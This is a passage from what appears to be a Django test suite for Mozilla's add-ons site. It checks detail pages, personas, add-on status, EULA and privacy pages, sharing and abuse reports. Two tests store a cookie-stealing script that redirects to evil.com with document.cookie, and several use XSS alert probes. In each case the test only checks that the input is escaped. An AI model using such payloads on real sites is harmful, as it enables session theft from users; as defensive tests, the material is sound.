        eq_(r.status_code, 404)

    def test_duplicate_version_number(self):
        Version.objects.create(addon=self.addon, version=self.version.version)
        url = reverse('addons.license', args=['a3615', self.version.version])
        r = self.client.get(url)
        eq_(r.status_code, 200)
        eq_(r.context['version'], self.addon.current_version)

    def test_cat_sidebar(self):
        check_cat_sidebar(reverse('addons.license', args=['a3615']),
                          self.addon)


class TestDetailPage(amo.tests.TestCase):
    fixtures = ['base/apps',
                'base/addon_3615',
                'base/users',
                'base/addon_59',
                'base/addon_4594_a9',
                'addons/listed',
                'addons/persona']

    def setUp(self):
        self.addon = Addon.objects.get(id=3615)
        self.url = self.addon.get_url_path()

    def test_site_title(self):
        r = self.client.get(self.url)
        eq_(pq(r.content)('h1.site-title').text(), 'Add-ons')

    def test_addon_headings(self):
        r = self.client.get(self.url)
        doc = pq(r.content)
        eq_(doc('h2:first').text(), 'About this Add-on')
        eq_(doc('.metadata .home').text(), 'Add-on home page')

    def test_anonymous_extension(self):
        response = self.client.get(self.url)
        eq_(response.status_code, 200)
        eq_(response.context['addon'].id, 3615)

    def test_anonymous_persona(self):
        response = self.client.get(reverse('addons.detail', args=['a15663']))
        eq_(response.status_code, 200)
        eq_(response.context['addon'].id, 15663)

    def test_review_microdata_personas(self):
        a = Addon.objects.get(id=15663)
        a.name = '<script>alert("fff")</script>'
        a.save()
        response = self.client.get(reverse('addons.detail', args=['a15663']))
        html = pq(response.content)('table caption').html()
        assert '&lt;script&gt;alert("fff")&lt;/script&gt;' in html
        assert '<script>' not in html

    def test_personas_context(self):
        response = self.client.get(reverse('addons.detail', args=['a15663']))
        assert 'review_form' in response.context
        assert 'reviews' in response.context
        assert 'get_replies' in response.context

    def test_unreviewed_robots(self):
        """Check that unreviewed add-ons do not get indexed."""
        url = self.addon.get_url_path()
        m = 'meta[content=noindex]'

        eq_(self.addon.status, amo.STATUS_PUBLIC)
        settings.ENGAGE_ROBOTS = True
        doc = pq(self.client.get(url).content)
        assert not doc(m)
        settings.ENGAGE_ROBOTS = False
        doc = pq(self.client.get(url).content)
        assert doc(m)

        self.addon.update(status=amo.STATUS_UNREVIEWED)
        settings.ENGAGE_ROBOTS = False
        doc = pq(self.client.get(url).content)
        assert doc(m)
        settings.ENGAGE_ROBOTS = True
        doc = pq(self.client.get(url).content)
        assert doc(m)

    def test_more_about(self):
        # Don't show more about box if there's nothing to populate it.
        self.addon.developer_comments_id = None
        self.addon.description_id = None
        self.addon.previews.all().delete()
        self.addon.save()

        r = self.client.get(self.url)
        doc = pq(r.content)

        eq_(doc('#more-about').length, 0)
        eq_(doc('.article.userinput').length, 0)

    def test_beta(self):
        """Test add-on with a beta channel."""
        get_pq_content = lambda: pq(
            self.client.get(self.url, follow=True).content)

        # Add a beta version and show it.
        mybetafile = self.addon.versions.all()[0].files.all()[0]
        mybetafile.status = amo.STATUS_BETA
        mybetafile.save()
        self.addon.update(status=amo.STATUS_PUBLIC)
        beta = get_pq_content()
        eq_(beta('#beta-channel').length, 1)

        # Now hide it.  Beta is only shown for STATUS_PUBLIC.
        self.addon.update(status=amo.STATUS_UNREVIEWED)
        beta = get_pq_content()
        eq_(beta('#beta-channel').length, 0)

    def test_type_redirect(self):
        """
        If current add-on's type is unsupported by app, redirect to an
        app that supports it.
        """
        # Thunderbird can't do search engines
        prefixer = amo.urlresolvers.get_url_prefix()
        prefixer.app = amo.THUNDERBIRD.short
        response = self.client.get(reverse('addons.detail', args=['a4594']),
                                   follow=False)
        eq_(response.status_code, 301)
        eq_(response['Location'].find(amo.THUNDERBIRD.short), -1)
        assert (response['Location'].find(amo.FIREFOX.short) >= 0)

    def test_compatible_app_redirect(self):
        """
        For add-ons incompatible with the current app, redirect to one
        that's supported.
        """
        comp_app = self.addon.compatible_apps.keys()[0]
        not_comp_app = [a for a in amo.APP_USAGE
                        if a not in self.addon.compatible_apps.keys()][0]

        # no SeaMonkey version => redirect
        prefixer = amo.urlresolvers.get_url_prefix()
        prefixer.app = not_comp_app.short
        r = self.client.get(reverse('addons.detail', args=[self.addon.slug]))
        eq_(r.status_code, 301)
        eq_(r['Location'].find(not_comp_app.short), -1)
        assert r['Location'].find(comp_app.short) >= 0

        # compatible app => 200
        prefixer = amo.urlresolvers.get_url_prefix()
        prefixer.app = comp_app.short
        r = self.client.get(reverse('addons.detail', args=[self.addon.slug]))
        eq_(r.status_code, 200)

    def test_external_urls(self):
        """Check that external URLs are properly escaped."""
        response = self.client.get(self.url)
        doc = pq(response.content)
        eq_(doc('aside a.home[href^="%s"]' % settings.REDIRECT_URL).length, 1)

    def test_no_privacy_policy(self):
        """Make sure privacy policy is not shown when not present."""
        self.addon.privacy_policy_id = None
        self.addon.save()
        response = self.client.get(self.url)
        doc = pq(response.content)
        eq_(doc('.privacy-policy').length, 0)

    def test_privacy_policy(self):
        self.addon.privacy_policy = 'foo bar'
        self.addon.save()
        response = self.client.get(self.url)
        doc = pq(response.content)
        eq_(doc('.privacy-policy').length, 1)
        privacy_url = reverse('addons.privacy', args=[self.addon.slug])
        assert doc('.privacy-policy').attr('href').endswith(privacy_url)

    def test_simple_html_is_rendered_in_privacy(self):
        self.addon.privacy_policy = """
            <strong> what the hell..</strong>
            <ul>
                <li>papparapara</li>
                <li>todotodotodo</li>
            </ul>
            <ol>
                <a href="irc://irc.mozilla.org/firefox">firefox</a>

                Introduce yourself to the community, if you like!
                This text will appear publicly on your user info page.
                <li>papparapara2</li>
                <li>todotodotodo2</li>
            </ol>
            """
        self.addon.save()

        r = self.client.get(reverse('addons.privacy', args=[self.addon.slug]))
        doc = pq(r.content)

        eq_(norm(doc(".policy-statement strong")),
            "<strong> what the hell..</strong>")
        eq_(norm(doc(".policy-statement ul")),
            "<ul><li>papparapara</li> <li>todotodotodo</li> </ul>")
        eq_(doc(".policy-statement ol a").text(),
            "firefox")
        eq_(norm(doc(".policy-statement ol li:first")),
            "<li>papparapara2</li>")

    def test_evil_html_is_not_rendered_in_privacy(self):
        self.addon.privacy_policy = """
            <script type="text/javascript">
                window.location = 'http://evil.com/?c=' + document.cookie;
            </script>
            Muhuhahahahahahaha!
            """
        self.addon.save()

        r = self.client.get(reverse('addons.privacy', args=[self.addon.slug]))
        doc = pq(r.content)

        policy = str(doc(".policy-statement"))
        assert policy.startswith(
                    '<div class="policy-statement">&lt;script'), (
                                            'Unexpected: %s' % policy[0:50])

    def test_button_size(self):
        """Make sure install buttons on the detail page are prominent."""
        response = self.client.get(reverse('addons.detail', args=['a3615']),
                                   follow=True)
        assert pq(response.content)('.button').hasClass('prominent')

    def test_button_src_default(self):
        r = self.client.get(self.url, follow=True)
        eq_((pq(r.content)('#addon .button').attr('href')
             .endswith('?src=dp-btn-primary')), True)

    def test_button_src_trickle(self):
        r = self.client.get(self.url + '?src=trickleortreat', follow=True)
        eq_((pq(r.content)('#addon .button').attr('href')
             .endswith('?src=trickleortreat')), True)

    def test_version_button_src_default(self):
        r = self.client.get(self.url, follow=True)
        eq_((pq(r.content)('#detail-relnotes .button').attr('href')
             .endswith('?src=dp-btn-version')), True)

    def test_version_button_src_trickle(self):
        r = self.client.get(self.url + '?src=trickleortreat', follow=True)
        eq_((pq(r.content)('#detail-relnotes .button').attr('href')
             .endswith('?src=trickleortreat')), True)

    def test_invalid_version(self):
        """Only render details pages for add-ons that have a version."""
        # Wipe all versions.
        self.addon.versions.all().delete()
        # Try accessing the details page.
        response = self.client.get(self.url)
        eq_(response.status_code, 404)

    def test_detailed_review_link(self):
        self.client.login(username='regular@mozilla.com', password='password')
        r = self.client.get(reverse('addons.detail', args=['a3615']))
        doc = pq(r.content)
        href = doc('#review-box a[href*="reviews/add"]').attr('href')
        assert href.endswith(reverse('addons.reviews.add', args=['a3615'])), (
            href)

    def test_no_listed_authors(self):
        r = self.client.get(reverse('addons.detail', args=['a59']))
        # We shouldn't show an avatar since this has no listed_authors.
        doc = pq(r.content)
        eq_(0, len(doc('.avatar')))

    def test_authors_xss(self):
        name = '<script>alert(1)</script>'
        user = UserProfile.objects.create(username='test',
                                          display_name=name)

        output = users_list([user])

        assert "&lt;script&gt;alert" in output
        assert "<script>alert" not in output

    def test_display_compatible_apps(self):
        """Show compatiblity info for extensions but not for search engines."""
        r = self.client.get(self.addon.get_url_path())
        eq_(pq(r.content)('#detail-relnotes .compat').length, 1)

        a = Addon.objects.filter(type=amo.ADDON_SEARCH)[0]
        r = self.client.get(a.get_url_path())
        eq_(pq(r.content)('#detail-relnotes .compat').length, 0)

    def test_show_profile(self):
        selector = '.author a[href="%s"]' % self.addon.meet_the_dev_url()

        assert not (self.addon.the_reason or self.addon.the_future)
        assert not pq(self.client.get(self.url).content)(selector)

        self.addon.the_reason = self.addon.the_future = '...'
        self.addon.save()
        assert pq(self.client.get(self.url).content)(selector)

    def test_no_restart(self):
        no_restart = '<span class="no-restart">No Restart</span>'
        f = self.addon.current_version.all_files[0]

        eq_(f.no_restart, False)
        r = self.client.get(self.url)
        assert no_restart not in r.content

        f.no_restart = True
        f.save()
        r = self.client.get(self.url)
        self.assertContains(r, no_restart)

    def test_no_backup(self):
        res = self.client.get(self.url)
        eq_(len(pq(res.content)('.backup-button')), 0)

    def test_backup(self):
        self.addon._backup_version = self.addon.versions.all()[0]
        self.addon.save()
        res = self.client.get(self.url)
        eq_(len(pq(res.content)('.backup-button')), 1)

    def test_disabled_user_message(self):
        self.addon.update(disabled_by_user=True)
        res = self.client.get(self.url)
        eq_(res.status_code, 404)
        assert 'removed by its author' in res.content

    def test_disabled_status_message(self):
        self.addon.update(status=amo.STATUS_DISABLED)
        res = self.client.get(self.url)
        eq_(res.status_code, 404)
        assert 'disabled by an administrator' in res.content

    def test_deleted_status_message(self):
        addon = Addon.objects.get(id=3615)
        addon.update(status=amo.STATUS_DELETED)
        url = reverse('addons.detail', args=[addon.slug])
        res = self.client.get(url)
        eq_(res.status_code, 404)

    @patch('addons.models.Addon.premium')
    def test_ready_to_buy(self, premium):
        self.addon.update(premium_type=amo.ADDON_PREMIUM,
                          status=amo.STATUS_PUBLIC)
        self.addon.premium.get_price = '0.99'
        response = self.client.get(self.url)
        eq_(response.status_code, 200)

    def test_not_ready_to_buy(self):
        self.addon.update(premium_type=amo.ADDON_PREMIUM,
                          status=amo.STATUS_NOMINATED)
        response = self.client.get(self.url)
        eq_(response.status_code, 200)
        eq_(pq(response.content)('.install a').length, 0)

    def test_more_url(self):
        response = self.client.get(self.url)
        eq_(pq(response.content)('#more-webpage').attr('data-more-url'),
            self.addon.get_url_path(more=True))


class TestImpalaDetailPage(amo.tests.TestCase):
    fixtures = ['base/addon_3615', 'base/addon_592', 'base/apps', 'base/users']

    def setUp(self):
        self.addon = Addon.objects.get(id=3615)
        self.url = self.addon.get_url_path()
        self.more_url = self.addon.get_url_path(more=True)

    def get_pq(self):
        return pq(self.client.get(self.url).content)

    def test_adu_stats_private(self):
        eq_(self.addon.public_stats, False)
        adu = self.get_pq()('#daily-users')
        eq_(adu.length, 1)
        eq_(adu.find('a').length, 0)

    def test_adu_stats_public(self):
        self.addon.update(public_stats=True)
        eq_(self.addon.show_adu(), True)
        adu = self.get_pq()('#daily-users')

        # Check that ADU does link to public statistics dashboard.
        eq_(adu.find('a').attr('href'),
            reverse('stats.overview', args=[self.addon.slug]))

        # Check formatted count.
        eq_(adu.text().split()[0], numberfmt(self.addon.average_daily_users))

        # Check if we hide link when there are no ADU.
        self.addon.update(average_daily_users=0)
        eq_(self.get_pq()('#daily-users').length, 0)

    def test_adu_stats_regular(self):
        self.client.login(username='regular@mozilla.com', password='password')
        # Should not be a link to statistics dashboard for regular users.
        adu = self.get_pq()('#daily-users')
        eq_(adu.length, 1)
        eq_(adu.find('a').length, 0)

    def test_adu_stats_admin(self):
        self.client.login(username='del@icio.us', password='password')
        # Check link to statistics dashboard for add-on authors.
        eq_(self.get_pq()('#daily-users a.stats').attr('href'),
            reverse('stats.overview', args=[self.addon.slug]))

    def test_downloads_stats_private(self):
        self.addon.update(type=amo.ADDON_SEARCH)
        eq_(self.addon.public_stats, False)
        adu = self.get_pq()('#weekly-downloads')
        eq_(adu.length, 1)
        eq_(adu.find('a').length, 0)

    def test_downloads_stats_public(self):
        self.addon.update(public_stats=True, type=amo.ADDON_SEARCH)
        eq_(self.addon.show_adu(), False)
        dls = self.get_pq()('#weekly-downloads')

        # Check that weekly downloads links to statistics dashboard.
        eq_(dls.find('a').attr('href'),
            reverse('stats.overview', args=[self.addon.slug]))

        # Check formatted count.
        eq_(dls.text().split()[0], numberfmt(self.addon.weekly_downloads))

        # Check if we hide link when there are no weekly downloads.
        self.addon.update(weekly_downloads=0)
        eq_(self.get_pq()('#weekly-downloads').length, 0)

    def test_downloads_stats_regular(self):
        self.addon.update(type=amo.ADDON_SEARCH)
        self.client.login(username='regular@mozilla.com', password='password')
        # Should not be a link to statistics dashboard for regular users.
        dls = self.get_pq()('#weekly-downloads')
        eq_(dls.length, 1)
        eq_(dls.find('a').length, 0)

    def test_downloads_stats_admin(self):
        self.addon.update(public_stats=True, type=amo.ADDON_SEARCH)
        self.client.login(username='del@icio.us', password='password')
        # Check link to statistics dashboard for add-on authors.
        eq_(self.get_pq()('#weekly-downloads a.stats').attr('href'),
            reverse('stats.overview', args=[self.addon.slug]))

    def test_perf_warning(self):
        eq_(self.addon.ts_slowness, None)
        eq_(self.get_pq()('.performance-note').length, 0)
        self.addon.update(ts_slowness=100)
        eq_(self.get_pq()('.performance-note').length, 1)

    def test_dependencies(self):
        eq_(self.get_pq()('.dependencies').length, 0)
        req = Addon.objects.get(id=592)
        AddonDependency.objects.create(addon=self.addon, dependent_addon=req)
        eq_(self.addon.all_dependencies, [req])
        cache.clear()
        d = self.get_pq()('.dependencies .hovercard')
        eq_(d.length, 1)
        eq_(d.find('h3').text(), unicode(req.name))
        eq_(d.find('a').attr('href')
            .endswith('?src=dp-dl-dependencies'), True)
        eq_(d.find('.install-button a').attr('href')
            .endswith('?src=dp-hc-dependencies'), True)

    def test_upsell(self):
        eq_(self.get_pq()('.upsell').length, 0)
        premie = Addon.objects.get(id=592)
        AddonUpsell.objects.create(free=self.addon, premium=premie, text='XXX')
        upsell = self.get_pq()('.upsell')
        eq_(upsell.length, 1)
        eq_(upsell.find('.prose').text(), 'XXX')
        hc = upsell.find('.hovercard')
        eq_(hc.length, 1)
        eq_(hc.find('h3').text(), unicode(premie.name))
        eq_(hc.find('a').attr('href').endswith('?src=dp-dl-upsell'), True)
        eq_(hc.find('.install-button a').attr('href')
            .endswith('?src=dp-hc-upsell'), True)

    def test_no_restart(self):
        f = self.addon.current_version.all_files[0]
        eq_(f.no_restart, False)
        eq_(self.get_pq()('.no-restart').length, 0)
        f.update(no_restart=True)
        eq_(self.get_pq()('.no-restart').length, 1)

    def test_license_link_builtin(self):
        g = 'http://google.com'
        version = self.addon._current_version
        license = version.license
        license.builtin = 1
        license.name = 'License to Kill'
        license.url = g
        license.save()
        eq_(license.builtin, 1)
        eq_(license.url, g)
        a = self.get_pq()('.secondary.metadata .source-license a')
        eq_(a.attr('href'), g)
        eq_(a.attr('target'), '_blank')
        eq_(a.text(), 'License to Kill')

    def test_license_link_custom(self):
        version = self.addon._current_version
        eq_(version.license.url, None)
        a = self.get_pq()('.secondary.metadata .source-license a')
        eq_(a.attr('href'), version.license_url())
        eq_(a.attr('target'), None)
        eq_(a.text(), 'Custom License')

    def get_more_pq(self):
        return pq(self.client.get_ajax(self.more_url).content)

    def test_can_review_free(self):
        self.addon.update(premium_type=amo.ADDON_FREE)
        eq_(len(self.get_more_pq()('#add-review')), 1)

    def test_can_review_premium(self):
        self.client.login(username='regular@mozilla.com', password='password')
        self.addon.addonpurchase_set.create(user_id=999)
        self.addon.update(premium_type=amo.ADDON_PREMIUM)
        eq_(len(self.get_more_pq()('#add-review')), 1)

    def test_not_review_premium(self):
        self.addon.update(premium_type=amo.ADDON_PREMIUM)
        eq_(len(self.get_more_pq()('#add-review')), 0)

    def test_other_addons(self):
        """Ensure listed add-ons by the same author show up."""
        other = Addon.objects.get(id=592)
        eq_(list(Addon.objects.listed(amo.FIREFOX).exclude(id=self.addon.id)),
            [other])

        add_addon_author(other, self.addon)
        doc = self.get_more_pq()('#author-addons')
        test_hovercards(self, doc, [other], src='dp-dl-othersby')

    def test_other_addons_no_webapps(self):
        """An app by the same author should not show up."""
        other = Addon.objects.get(id=592)
        other.update(type=amo.ADDON_WEBAPP)

        add_addon_author(other, self.addon)
        eq_(self.get_more_pq()('#author-addons').length, 0)

    def test_other_addons_no_unlisted(self):
        """An unlisted add-on by the same author should not show up."""
        other = Addon.objects.get(id=592)
        other.update(status=amo.STATUS_UNREVIEWED, disabled_by_user=True)

        add_addon_author(other, self.addon)
        eq_(self.get_more_pq()('#author-addons').length, 0)

    def test_other_addons_by_others(self):
        """Add-ons by different authors should not show up."""
        author = UserProfile.objects.get(pk=999)
        AddonUser.objects.create(addon=self.addon, user=author, listed=True)
        eq_(self.get_more_pq()('#author-addons').length, 0)

    def test_other_addons_none(self):
        eq_(self.get_more_pq()('#author-addons').length, 0)

    def test_author_watermarked(self):
        # TODO: remove when the marketplace is live.
        waffle.models.Switch.objects.create(name='marketplace', active=True)

        # Test that an author can get a watermarked addon.
        self.addon, self.price = setup_premium(self.addon)
        assert self.client.login(username=self.addon.authors.all()[0].email,
                                 password='password')
        eq_(self.get_pq()('aside .prominent').eq(1).attr('href'),
            reverse('downloads.latest', args=[self.addon.slug]))

    def test_not_author(self):
        waffle.models.Switch.objects.create(name='marketplace', active=True)

        # A non-author should not see the download link.
        self.addon, self.price = setup_premium(self.addon)
        assert self.client.login(username='regular@mozilla.com',
                                 password='password')
        eq_(self.get_pq()('.prominent').length, 1)

    def test_categories(self):
        c = self.addon.all_categories[0]
        c.application_id = amo.THUNDERBIRD.id
        c.save()
        links = self.get_more_pq()('#related ul:first').find('a')
        expected = [(unicode(c.name), c.get_url_path()) for c in
                    self.addon.categories.filter(application=amo.FIREFOX.id)]
        amo.tests.check_links(expected, links)


class TestPersonas(object):

    def create_addon_user(self, addon, user=None):
        if user is None:
            user = UserProfile.objects.get(pk=999)
        AddonUser.objects.create(addon=addon, user=user)


class TestPersonaDetailPage(TestPersonas, amo.tests.TestCase):
    fixtures = ['addons/persona', 'base/users']

    def setUp(self):
        self.addon = Addon.objects.get(id=15663)
        self.create_addon_user(self.addon)
        self.persona = self.addon.persona
        self.url = self.addon.get_url_path()

    def test_persona_images(self):
        r = self.client.get(self.url)
        doc = pq(r.content)
        eq_(doc('h2.addon img').attr('src'), self.persona.icon_url)
        style = doc('#persona div[data-browsertheme]').attr('style')
        assert self.persona.preview_url in style, (
            'style attribute %s does not link to %s' % (
            style, self.persona.preview_url))

    def test_more_personas(self):
        other = addon_factory(type=amo.ADDON_PERSONA)
        self.create_addon_user(other)
        r = self.client.get(self.url)
        eq_(pq(r.content)('#more-artist .more-link').length, 1)

    def test_more_personas_no_addon(self):
        other = addon_factory(type=amo.ADDON_EXTENSION)
        self.create_addon_user(other)
        r = self.client.get(self.url)
        eq_(pq(r.content)('#more-artist .more-link').length, 0)

    def test_new_more_personas(self):
        other = addon_factory(type=amo.ADDON_PERSONA)
        self.create_addon_user(other)
        self.persona.persona_id = 0
        self.persona.save()
        r = self.client.get(self.url)
        eq_(pq(r.content)('#more-artist .more-link').length, 0)

    def test_other_personas(self):
        """Ensure listed personas by the same author show up."""
        addon_factory(type=amo.ADDON_PERSONA, status=amo.STATUS_NULL)
        addon_factory(type=amo.ADDON_PERSONA, status=amo.STATUS_LITE)
        addon_factory(type=amo.ADDON_PERSONA, disabled_by_user=True)

        other = addon_factory(type=amo.ADDON_PERSONA)
        self.create_addon_user(other)
        eq_(other.status, amo.STATUS_PUBLIC)
        eq_(other.disabled_by_user, False)

        # TODO(cvan): Uncomment this once Personas detail page is impalacized.
        #doc = self.get_more_pq()('#author-addons')
        #test_hovercards(self, doc, [other], src='dp-dl-othersby')

        r = self.client.get(self.url)
        eq_(list(r.context['author_personas']), [other])
        a = pq(r.content)('#more-artist a[data-browsertheme]')
        eq_(a.length, 1)
        eq_(a.attr('href'), other.get_url_path())


class TestStatus(amo.tests.TestCase):
    fixtures = ['base/addon_3615', 'addons/persona']

    def setUp(self):
        self.addon = Addon.objects.get(id=3615)
        self.version = self.addon.current_version
        assert self.addon.status == amo.STATUS_PUBLIC
        self.url = self.addon.get_url_path()

        self.persona = Addon.objects.get(id=15663)
        assert self.persona.status == amo.STATUS_PUBLIC
        self.persona_url = self.persona.get_url_path()

    def test_incomplete(self):
        self.addon.update(status=amo.STATUS_NULL)
        eq_(self.client.get(self.url).status_code, 404)

    def test_unreviewed(self):
        self.addon.update(status=amo.STATUS_UNREVIEWED)
        eq_(self.client.get(self.url).status_code, 200)

    def test_pending(self):
        self.addon.update(status=amo.STATUS_PENDING)
        eq_(self.client.get(self.url).status_code, 404)

    def test_nominated(self):
        self.addon.update(status=amo.STATUS_NOMINATED)
        eq_(self.client.get(self.url).status_code, 200)

    def test_public(self):
        self.addon.update(status=amo.STATUS_PUBLIC)
        eq_(self.client.get(self.url).status_code, 200)

    def test_deleted(self):
        self.addon.update(status=amo.STATUS_DELETED)
        eq_(self.client.get(self.url).status_code, 404)

    def test_disabled(self):
        self.addon.update(status=amo.STATUS_DISABLED)
        eq_(self.client.get(self.url).status_code, 404)

    def test_app_disabled(self):
        waffle.models.Flag.objects.create(name='accept-webapps', everyone=True)
        self.addon.update(type=amo.ADDON_WEBAPP, status=amo.STATUS_DISABLED)
        # Pull webapp back out for class override to take effect
        addon = Addon.objects.get(id=3615)
        eq_(self.client.head(addon.get_url_path()).status_code, 404)

    def test_app_deleted(self):
        waffle.models.Flag.objects.create(name='accept-webapps', everyone=True)
        addon = Addon.objects.get(id=3615)
        self.addon.update(type=amo.ADDON_WEBAPP, status=amo.STATUS_DELETED)
        # Pull webapp back out for class override to take effect
        eq_(self.client.head(addon.get_url_path()).status_code, 404)

    def test_lite(self):
        self.addon.update(status=amo.STATUS_LITE)
        eq_(self.client.get(self.url).status_code, 200)

    def test_lite_and_nominated(self):
        self.addon.update(status=amo.STATUS_LITE_AND_NOMINATED)
        eq_(self.client.get(self.url).status_code, 200)

    def test_purgatory(self):
        self.addon.update(status=amo.STATUS_PURGATORY)
        eq_(self.client.get(self.url).status_code, 200)

    def test_disabled_by_user(self):
        self.addon.update(disabled_by_user=True)
        eq_(self.client.get(self.url).status_code, 404)

    def test_app_disabled_by_user(self):
        waffle.models.Flag.objects.create(name='accept-webapps', everyone=True)
        self.addon.update(type=amo.ADDON_WEBAPP, disabled_by_user=True)
        # Pull webapp back out for class override to take effect
        addon = Addon.objects.get(id=3615)
        eq_(self.client.head(addon.get_url_path()).status_code, 404)

    def new_version(self, status):
        v = Version.objects.create(addon=self.addon)
        File.objects.create(version=v, status=status)
        return v

    def test_public_new_lite_version(self):
        self.new_version(amo.STATUS_LITE)
        eq_(self.addon.get_version(), self.version)

    def test_public_new_nominated_version(self):
        self.new_version(amo.STATUS_NOMINATED)
        eq_(self.addon.get_version(), self.version)

    def test_public_new_public_version(self):
        v = self.new_version(amo.STATUS_PUBLIC)
        eq_(self.addon.get_version(), v)

    def test_public_new_unreviewed_version(self):
        self.new_version(amo.STATUS_UNREVIEWED)
        eq_(self.addon.get_version(), self.version)

    def test_lite_new_unreviewed_version(self):
        self.addon.update(status=amo.STATUS_LITE)
        self.new_version(amo.STATUS_UNREVIEWED)
        eq_(self.addon.get_version(), self.version)

    def test_lite_new_lan_version(self):
        self.addon.update(status=amo.STATUS_LITE)
        v = self.new_version(amo.STATUS_LITE_AND_NOMINATED)
        eq_(self.addon.get_version(), v)

    def test_lite_new_lite_version(self):
        self.addon.update(status=amo.STATUS_LITE)
        v = self.new_version(amo.STATUS_LITE)
        eq_(self.addon.get_version(), v)

    def test_lite_new_full_version(self):
        self.addon.update(status=amo.STATUS_LITE)
        v = self.new_version(amo.STATUS_PUBLIC)
        eq_(self.addon.get_version(), v)

    def test_lan_new_lite_version(self):
        self.addon.update(status=amo.STATUS_LITE_AND_NOMINATED)
        v = self.new_version(amo.STATUS_LITE)
        eq_(self.addon.get_version(), v)

    def test_lan_new_full_version(self):
        self.addon.update(status=amo.STATUS_LITE_AND_NOMINATED)
        v = self.new_version(amo.STATUS_PUBLIC)
        eq_(self.addon.get_version(), v)

    def test_persona(self):
        for status in amo.STATUS_CHOICES.keys():
            self.persona.status = status
            self.persona.save()
            eq_(self.client.head(self.persona_url).status_code,
                200 if status == amo.STATUS_PUBLIC else 404)

    def test_persona_disabled(self):
        for status in amo.STATUS_CHOICES.keys():
            self.persona.status = status
            self.persona.disabled_by_user = True
            self.persona.save()
            eq_(self.client.head(self.persona_url).status_code, 404)


class TestTagsBox(amo.tests.TestCase):
    fixtures = ['base/addontag']

    def test_tag_box(self):
        """Verify that we don't show duplicate tags."""
        r = self.client.get_ajax(reverse('addons.detail_more', args=[8680]),
                                 follow=True)
        doc = pq(r.content)
        eq_('SEO', doc('#tagbox ul').children().text())


class TestEulaPolicyRedirects(amo.tests.TestCase):

    def test_eula_legacy_url(self):
        """
        See that we get a 301 to the zamboni style URL
        """
        response = self.client.get('/en-US/firefox/addons/policy/0/592/42')
        eq_(response.status_code, 301)
        assert (response['Location'].find('/addon/592/eula/42') != -1)

    def test_policy_legacy_url(self):
        """
        See that we get a 301 to the zamboni style URL
        """
        response = self.client.get('/en-US/firefox/addons/policy/0/592/')
        eq_(response.status_code, 301)
        assert (response['Location'].find('/addon/592/privacy/') != -1)


class TestEula(amo.tests.TestCase):
    fixtures = ['addons/eula+contrib-addon']

    def setUp(self):
        self.addon = Addon.objects.get(id=11730)
        self.url = self.get_url()

    def get_url(self, args=[]):
        return reverse('addons.eula', args=[self.addon.slug] + args)

    def test_current_version(self):
        r = self.client.get(self.url)
        eq_(r.context['version'], self.addon.current_version)

    def test_simple_html_is_rendered(self):
        self.addon.eula = """
            <strong> what the hell..</strong>
            <ul>
                <li>papparapara</li>
                <li>todotodotodo</li>
            </ul>
            <ol>
                <a href="irc://irc.mozilla.org/firefox">firefox</a>

                Introduce yourself to the community, if you like!
                This text will appear publicly on your user info page.
                <li>papparapara2</li>
                <li>todotodotodo2</li>
            </ol>
            """
        self.addon.save()

        r = self.client.get(self.url)
        doc = pq(r.content)

        eq_(norm(doc('.policy-statement strong')),
            '<strong> what the hell..</strong>')
        eq_(norm(doc('.policy-statement ul')),
            '<ul><li>papparapara</li> <li>todotodotodo</li> </ul>')
        eq_(doc('.policy-statement ol a').text(), 'firefox')
        eq_(norm(doc('.policy-statement ol li:first')),
            '<li>papparapara2</li>')

    def test_evil_html_is_not_rendered(self):
        self.addon.eula = """
            <script type="text/javascript">
                window.location = 'http://evil.com/?c=' + document.cookie;
            </script>
            Muhuhahahahahahaha!
            """
        self.addon.save()

        r = self.client.get(self.url)
        doc = pq(r.content)

        policy = str(doc('.policy-statement'))
        assert policy.startswith('<div class="policy-statement">&lt;script'), (
            'Unexpected: %s' % policy[:50])

    def test_old_version(self):
        old = self.addon.versions.order_by('created')[0]
        assert old != self.addon.current_version
        r = self.client.get(self.get_url([old.all_files[0].id]))
        eq_(r.context['version'], old)

    def test_redirect_no_eula(self):
        self.addon.update(eula=None)
        r = self.client.get(self.url, follow=True)
        self.assertRedirects(r, self.addon.get_url_path())

    def test_cat_sidebar(self):
        check_cat_sidebar(self.url, self.addon)


class TestPrivacyPolicy(amo.tests.TestCase):
    fixtures = ['addons/eula+contrib-addon']

    def setUp(self):
        self.addon = Addon.objects.get(id=11730)
        self.url = reverse('addons.privacy', args=[self.addon.slug])

    def test_redirect_no_eula(self):
        eq_(self.addon.privacy_policy, None)
        r = self.client.get(self.url, follow=True)
        self.assertRedirects(r, self.addon.get_url_path())

    def test_cat_sidebar(self):
        self.addon.privacy_policy = 'shizzle'
        self.addon.save()
        check_cat_sidebar(self.url, self.addon)


class TestAddonSharing(amo.tests.TestCase):
    fixtures = ['base/addon_3615']

    def test_redirect_sharing(self):
        addon = Addon.objects.get(id=3615)
        r = self.client.get(reverse('addons.share', args=['a3615']),
                            {'service': 'delicious'})
        url = absolutify(unicode(addon.get_url_path()))
        summary = truncate(addon.summary, length=250)
        eq_(r.status_code, 302)
        assert iri_to_uri(addon.name) in r['Location']
        assert iri_to_uri(url) in r['Location']
        assert iri_to_uri(summary) in r['Location']


class TestReportAbuse(amo.tests.TestCase):
    fixtures = ['addons/persona', 'base/addon_3615', 'base/users']

    def setUp(self):
        settings.RECAPTCHA_PRIVATE_KEY = 'something'
        self.full_page = reverse('addons.abuse', args=['a3615'])

    @patch('captcha.fields.ReCaptchaField.clean')
    def test_abuse_anonymous(self, clean):
        clean.return_value = ""
        self.client.post(self.full_page, {'text': 'spammy'})
        eq_(len(mail.outbox), 1)
        assert 'spammy' in mail.outbox[0].body
        report = AbuseReport.objects.get(addon=3615)
        eq_(report.message, 'spammy')
        eq_(report.reporter, None)

    def test_abuse_anonymous_fails(self):
        r = self.client.post(self.full_page, {'text': 'spammy'})
        assert 'recaptcha' in r.context['abuse_form'].errors

    def test_abuse_logged_in(self):
        self.client.login(username='regular@mozilla.com', password='password')
        self.client.post(self.full_page, {'text': 'spammy'})
        eq_(len(mail.outbox), 1)
        assert 'spammy' in mail.outbox[0].body
        report = AbuseReport.objects.get(addon=3615)
        eq_(report.message, 'spammy')
        eq_(report.reporter.email, 'regular@mozilla.com')

    def test_abuse_name(self):
        addon = Addon.objects.get(pk=3615)
        addon.name = 'Bmrk.ru Социальные закладки'
        addon.save()

        self.client.login(username='regular@mozilla.com', password='password')
        self.client.post(self.full_page, {'text': 'spammy'})
        assert 'spammy' in mail.outbox[0].body
        assert AbuseReport.objects.get(addon=addon)

    def test_abuse_persona(self):
